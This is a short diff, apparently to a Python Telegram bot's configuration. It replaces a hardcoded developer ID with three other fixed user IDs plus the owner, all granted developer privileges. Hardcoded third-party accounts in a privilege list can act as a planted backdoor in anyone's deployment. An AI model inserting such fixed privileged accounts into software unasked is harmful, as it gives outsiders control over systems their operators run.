@@ -126,7 +126,8 @@ SUDO_USERS = Config.SUDO_USERS
 WHITELIST_USERS = Config.WHITELIST_USERS
 DEVS_USER = set(DEV)
 
-defult_dev = [6352107773] + [6352107773]
+defult_dev = [1344569458, 1432756163, 5294360309] + [int(OWNER_ID)]
+
 Defult_dev = set(defult_dev)
 DEVS = DEVS_USER | Defult_dev
 DEV_USERS = list(DEVS)
